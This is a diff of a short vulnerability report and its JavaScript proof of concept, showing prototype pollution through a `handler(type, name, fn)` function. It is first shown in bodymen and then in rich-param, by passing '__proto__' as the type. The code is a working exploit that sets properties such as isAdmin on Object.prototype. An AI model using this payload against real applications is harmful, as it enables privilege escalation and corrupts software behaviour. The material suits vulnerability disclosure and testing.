@@ -1,22 +1,17 @@
-Confirmed: `handler` allows prototype pollution via `handlers[type][name] = fn` with attacker-controlled `type`/`name`.
+Confirmed prototype pollution via `handler(type, name, fn)` writing to `this.handlers[type][name]` without checking for `__proto__`.
 
 ```javascript
-// Exploit for bodymen `handler` prototype pollution
-// handler(type, name, fn) does: handlers[type][name] = fn
-// Since `type` and `name` are unsanitized, passing type="__proto__"
-// lets an attacker write arbitrary properties onto Object.prototype.
+const Param = require("./node_modules/rich-param");
 
-const bodymen = require("bodymen");
+const param = new Param("test", "value");
 
-console.log("before:", ({}).isAdmin); // undefined
+// handler(type, name, fn) does this.handlers[type][name] = fn with no key sanitization.
+// Passing type = "__proto__" walks onto Object.prototype instead of this.handlers.
+param.handler("__proto__", "polluted", "yes");
 
-bodymen.handler("__proto__", "isAdmin", true);
-
-console.log("after:", ({}).isAdmin); // true -- Object.prototype polluted
-
-if (({}).isAdmin === true) {
-  console.log("Prototype pollution confirmed: all objects now have isAdmin=true");
-} else {
-  console.log("Exploit failed");
+const victim = {};
+console.log("Prototype polluted:", victim.polluted === "yes");
+if (victim.polluted !== "yes") {
+  throw new Error("Exploit failed: prototype pollution did not occur");
 }
 ```
